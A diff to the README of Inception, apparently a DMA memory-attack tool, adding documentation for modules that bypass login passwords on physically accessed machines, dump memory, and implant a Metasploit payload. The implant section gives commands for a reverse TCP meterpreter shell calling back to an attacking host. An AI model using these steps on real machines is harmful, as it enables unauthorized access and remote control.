@@ -32,11 +32,11 @@ machine; the idea that every password is correct. In other words, the
 equivalent of a [memory inception] [1].
 
 
-### BRRRRRAAAAAWWWWRWRRMRMRMMMMM!!! (But why?)
+### BRRRRRAAAAAWWWWRWRRMRMRMMMMM!!! But why?
 
-The professionals [are using this technique] [2], so why not you? Inception is
-free, as in beer. A professional equivalent tool will set you back 10 000 USD.
-Hack back!
+The world's forensics experts, government and agencies are using 
+[similar tools] [2], so why not you? Inception is free, as in beer. A
+professional equivalent tool will set you back 10 000 USD. Hack back!
 
 
 Key data
@@ -122,7 +122,7 @@ Simply type:
 
 For a more complete and up-to-date description, please run:
 
-    incept [module name] -h
+    incept -h
 
 or see the [tool home page] [5].
 
@@ -133,6 +133,10 @@ Modules
 As of version 0.4.0, Inception has been modularized. The current modules, and
 their functionality is described below.
 
+For detailed options on usage, run:
+
+    incept [module name] -h
+
 Note: Mavericks since 10.8.2 on Ivy Bridge (>= 2012 Macs) have enabled VT-D 
 effectively blocking DMA requests and thwarting almost all modules. Look 
 for `vtd[0] fault` entries in your log/console.
@@ -140,7 +144,7 @@ for `vtd[0] fault` entries in your log/console.
 
 ### Unlock
 
-The unlock can unlock (any password accepted) and escalate privileges
+The `unlock` module can unlock (any password accepted) and escalate privileges
 to Administrator/root on almost* any powered on machine you have physical
 access to. module is primarily attended to do its magic against
 computers that utilize full disk encryption such as BitLocker, FileVault,
@@ -196,12 +200,51 @@ the `runas` or `sudo -s` commands, respectively.
 
 ### Implant
 
-texte 
+The `implant` module implants a (potentially memory-only) Metasploit payload
+directly to the volatile memory of the target machine. It integrates with MSF
+through the `msfrpcd` daemon that is included in all versions of Metasploit.
+
+The current version only work as a proof-of-concept against Windows 7 SP1 x86.
+No other OSes, versions or architectures are supported, nor is there any
+guarantee that they will be supported in the future. If you want to change
+this, send me a wad of cash in unmarked dollar bills or a pull request.
+
+To use it, start `msfrpcd`:
+
+    msfrpc -P [password]
+
+Then launch inception:
+
+    incept implant --msfpw [password] --msfopts [options]
+
+As an example, to create a reverse TCP meterpreter shell from the target
+machine to your attacking host, first start the `msfrpcd` dameon, and then
+launch a console listening for callbacks. 
+
+    msfrpcd -P password
+    msfconsole
+
+In the console, we configure the receiving end of the payload. We're setting
+the `EXITFUNC` option to `thread` to ensure that the target process stays alive
+if something should go awry:
+
+    use exploit/multi/handler
+    set payload windows/meterpreter/reverse_tcp
+    set LHOST 172.16.1.1
+    set EXITFUNC thread
+    exploit -j
+
+Then, in another terminal, we launch Inception:
+
+    incept implant --msfpw password
+
+TODO: Insert output
 
 
 ### Dump
 
-text
+The `dump` module facilitates dumping of memory from the target to the
+attacking host.
 
 
 Known bugs / caveats
